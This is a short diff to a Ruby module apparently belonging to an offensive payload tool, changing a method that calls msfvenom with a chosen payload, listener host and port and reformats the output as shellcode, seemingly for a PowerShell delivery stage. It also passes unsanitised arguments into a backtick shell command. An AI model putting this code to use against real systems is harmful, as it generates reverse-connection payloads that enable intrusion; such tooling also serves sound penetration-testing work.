@@ -115,14 +115,16 @@ module Lib_meta
 
   def psh_shellcode(payload, lhost, lport)
     print_status('Generating shellcode')
-    shellcode = `msfvenom --payload #{payload} LHOST=#{lhost} LPORT=#{lport} C`
+    msfcmd = "msfvenom --payload #{payload} LHOST=#{lhost} "
+    msfcmd << "LPORT=#{lport} -f c"
+    shellcode = `#{msfcmd} 2> /dev/null`
     shellcode = shellcode.gsub('\\', ',0')
     shellcode = shellcode.delete('+')
     shellcode = shellcode.delete('"')
     shellcode = shellcode.delete("\n")
     shellcode = shellcode.delete("\s")
-    shellcode[0..4] = ''
-    return shellcode
+    shellcode[0..18] = ''
+    shellcode
   end
 
 	def build_payload(payload, lhost, lport)
